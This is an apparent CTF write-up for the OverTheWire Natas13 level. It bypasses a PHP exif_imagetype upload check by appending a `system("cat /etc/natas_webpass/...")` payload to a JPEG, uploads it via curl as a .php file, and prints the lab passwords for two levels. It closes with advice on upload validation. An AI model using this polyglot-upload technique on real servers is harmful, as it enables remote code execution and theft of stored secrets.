---
category: natas
title: Natas13 - Code Injection Part 2
---

website: http://natas13.natas.labs.overthewire.org/ (password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY)

In this challenge, a major different from the previous level is that a file type check is added to ensure the uploaded file is an image.
The file type check is done through the PHP function `exif_imagetype`. See below:

```php
if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
    echo "File is not an image";
    ...
}
```

Let's look at how `exif_imagetype` works. According to <a href="https://www.php.net/manual/en/function.exif-imagetype.php">this</a> PHP document,
we can learn that the function reads the first bytes of an image and checks its signature.
As such, I ran a quick test by following steps below:
1. Download a jpg file, e.g., icon.jpg.
2. Inject php code into icon.jpg: <small>$ echo '<?php echo system("cat /etc/natas_webpass/natas14"); ?>' >> icon.jpg</small>
3. Run the command to test the contaminated jpg file: <small>$ php -r 'echo exif_imagetype("icon.jpg");'</small>. The command gives the output "2", which means `exif_imagetype()` still considers icon.jpg as a valid JPEG even though it has been injected with some PHP codes.

Through the above test, we learned that we can bypass the image validation check by injecting a PHP code into a valid jpg file.
I submitted the modified JPEG file using the curl command:

```shell
$ curl -u natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY  http://natas13.natas.labs.overthewire.org/   -F "filename=icon.php" -F "uploadedfile=@icon.jpg"
... ...
The file <a href="upload/5q99vw2yhb.php">upload/5q99vw2yhb.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

Following the generated link, which is a PHP page, I am able to retrieve the password for Natas14: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1.

<strong>LESSONS LEARNED</strong>

Same with the previous level, this challenge is also about code injection.
As what we learned already in Natas12, a web server should validate user input and should not rely on a user defined file extension.

Moreover, if possible, a web server should audit the content of a file that is uploaded by users.
Another way to reduce this kind of code injection is to reprocess the uploaded image at the server side and then save the reprocessed image.
For exmaple, tools such as <a href="https://www.php.net/manual/en/intro.imagick.php">Imagick</a> can achieve such a goal. 

